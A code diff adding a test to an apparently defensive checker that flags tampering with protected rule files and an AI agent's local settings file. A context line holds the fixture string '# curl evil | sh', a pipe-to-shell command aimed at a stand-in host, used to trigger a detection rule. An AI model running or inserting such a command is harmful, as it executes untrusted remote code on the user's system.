@@ -223,3 +223,18 @@ def test_locked_rule_file_is_exempt_from_content_rules(locked_repo: Path, lock_f
     assert "T-007" not in ids(run_check(cfg, same))
     changed = _diff_with("rules/basic.yaml", locked + "# curl evil | sh\n")
     assert "T-007" in ids(run_check(cfg, changed))
+
+
+def test_text_diff_of_protected_file_is_not_exempt_by_disk_state(locked_repo: Path) -> None:
+    cfg = load_config(locked_repo)
+    text = (
+        "diff --git a/rules/basic.yaml b/rules/basic.yaml\n"
+        "--- a/rules/basic.yaml\n+++ b/rules/basic.yaml\n"
+        "@@ -1,1 +1,1 @@\n-version: 1\n+version: 1 # weakened\n"
+        "diff --git a/.claude/settings.local.json b/.claude/settings.local.json\n"
+        "new file mode 100644\n"
+        "--- /dev/null\n+++ b/.claude/settings.local.json\n@@ -0,0 +1 @@\n+{}\n"
+    )
+    res = run_check(cfg, Request(diff=gitsrc.text_diff(cfg, text), check_protected_drift=False))
+    flagged = {f.path for f in res.findings if f.rule_id == "T-004"}
+    assert flagged == {"rules/basic.yaml", ".claude/settings.local.json"}
